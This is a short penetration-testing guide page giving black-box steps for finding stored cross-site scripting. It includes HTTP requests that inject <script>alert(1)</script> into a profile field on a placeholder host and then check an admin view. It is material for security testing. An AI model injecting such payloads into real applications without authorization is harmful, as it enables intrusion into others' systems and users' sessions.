### Black Box

#### s

{% stepper %}
{% step %}
Navigate to the target web application and identify all possible user input points such as profile fields, comments, feedback forms, or file uploads where user-supplied data may be stored by the application

```http
POST /profile/update HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

Bio=Unk9vvN
```
{% endstep %}

{% step %}
Using Burp Suite, intercept the request and modify the user-supplied input by injecting a test payload

```http
POST /profile/update HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

bio=<script>alert(1)</script>
```
{% endstep %}

{% step %}
Send the request and ensure that the application stores the injected payload without immediate execution
{% endstep %}

{% step %}
Then navigate to all possible functionalities that may process or display the stored data such as admin panels, reports, or email notifications

```http
GET /admin/viewProfile?id=123 HTTP/1.1
Host: target.com
```
{% endstep %}

{% step %}
Observe the server response and check whether the previously injected payload is executed when the stored data is processed by another functionality
{% endstep %}

{% step %}
If the injected payload executes in a different context or at a later time, the vulnerability is confirmed
{% endstep %}
{% endstepper %}
